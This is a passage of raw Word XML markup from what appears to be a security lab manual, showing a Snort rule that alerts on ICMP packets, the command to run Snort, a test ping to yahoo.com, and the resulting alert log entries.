          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>cmp.r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">rt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>cmp any any -&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>any any (msg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>acket";</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">d:477; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ev:3;)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82" w:line="460" w:lineRule="atLeast"/>
        <w:ind w:left="100" w:right="741"/>
      </w:pPr>
      <w:hyperlink r:id="rId77">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snort -i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">p4p1 -c </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort.conf  -l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>og</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">snort/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>nother</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>ter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>nal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId78">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 xml:space="preserve">ab]# </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:hyperlink r:id="rId79">
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>ng w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-13"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>.yahoo.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="4" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId80">
        <w:r>
          <w:t>[roo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>oca</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>host</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ab]#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6090"/>
      </w:pPr>
      <w:r>
        <w:t>[**] [1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>477</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>3] ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>[**] [Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>06-15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1.187877 192.168.43.148 -&gt; 106.10.138.240</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3424"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>MP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TL:</w:t>
      </w:r>
      <w:r>
        <w:t>64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0x0 ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>45855 Ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>20 Dg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mL</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">84 DF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>yp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>8  Cod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>14680   Seq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">64  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>CHO</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6090"/>
      </w:pPr>
      <w:r>
        <w:t>[**] [1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>477</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>3] ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>[**] [Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>06-15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>03</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1.341739 106.10.138.240 -&gt; 192.168.43.148</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>MP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>TL:</w:t>
      </w:r>
      <w:r>
        <w:t>52</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0x38 ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>2493 Ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>20 Dg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mL</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>84</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>yp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0  Cod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>14680  Seq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">64  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>CHO R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6090"/>
      </w:pPr>
      <w:r>
        <w:t>[**] [1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>477</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>3] ICMP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>[**] [Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
